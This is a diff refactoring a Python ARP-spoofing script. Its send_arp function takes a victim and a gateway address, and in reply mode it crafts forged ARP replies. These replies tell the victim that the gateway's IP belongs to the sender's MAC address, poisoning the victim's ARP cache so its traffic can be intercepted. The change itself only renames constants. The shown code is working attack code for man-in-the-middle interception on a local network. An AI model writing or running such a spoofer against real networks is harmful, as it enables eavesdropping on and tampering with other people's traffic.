@@ -4,11 +4,15 @@ import netifaces as netif# pip install netifaces
 from struct import pack, unpack
 from binascii import hexlify, unhexlify
 
-ETHER_ARP_TYPE = 0x0806
+ETHER_TYPE_ARP = 0x0806
 HARD_TYPE = 0x0001
 PROTO_TYPE = 0x0800
 HARD_ADDR_LEN = 0x06
 PROTO_ADDR_LEN = 0x04
+ARP_REQUEST = 0x0001
+ARP_REPLY = 0x0002
+ETHER_HDR_SIZE = 14
+
 
 def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER):
     s = socket(PF_PACKET, SOCK_RAW, SOCK_RAW)
@@ -17,7 +21,7 @@ def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER)
     if OPER == "REQUEST":
         DST_MAC = '\xff\xff\xff\xff\xff\xff' ## Broadcast
         SRC_MAC = my_mac
-        OPERATION = 0x0001
+        OPERATION = ARP_REQUEST
         SEND_HDR_ADDR = my_mac
         SEND_PROTO_ADDR = my_ip
         TARGET_HDR_ADDR = '\x00\x00\x00\x00\x00\x00' # Don't know MAC
@@ -25,7 +29,7 @@ def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER)
     if OPER == "REPLY":
         DST_MAC = victim_mac
         SRC_MAC = my_mac
-        OPERATION = 0x0002
+        OPERATION = ARP_REPLY
         SEND_HDR_ADDR = my_mac
         SEND_PROTO_ADDR = gateway_ip
         TARGET_HDR_ADDR = victim_mac
@@ -34,7 +38,7 @@ def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER)
     ether_hdr = ""
     ether_hdr += pack('!6s', DST_MAC)
     ether_hdr += pack('!6s', SRC_MAC)
-    ether_hdr += pack('!H', ETHER_ARP_TYPE)
+    ether_hdr += pack('!H', ETHER_TYPE_ARP)
     arp_hdr = ""
     arp_hdr += pack('!H', HARD_TYPE)
     arp_hdr += pack('!H', PROTO_TYPE)
@@ -49,9 +53,9 @@ def send_arp(interface, victim_mac, victim_ip,  my_ip, my_mac, gateway_ip, OPER)
     s.send(ether_hdr + arp_hdr)
 
     if OPER == "REQUEST":
-        s = socket(PF_PACKET, SOCK_RAW, ntohs(0x0806))
+        s = socket(PF_PACKET, SOCK_RAW, ntohs(ETHER_TYPE_ARP))
         s.bind((interface, 0))
-        ether_hdr = s.recvfrom(65535)[0][0:14]
+        ether_hdr = s.recvfrom(65535)[0][:ETHER_HDR_SIZE]
         ether_hdr = unpack("!6s6s2s", ether_hdr)
         victim_mac = ether_hdr[1]
         return victim_mac
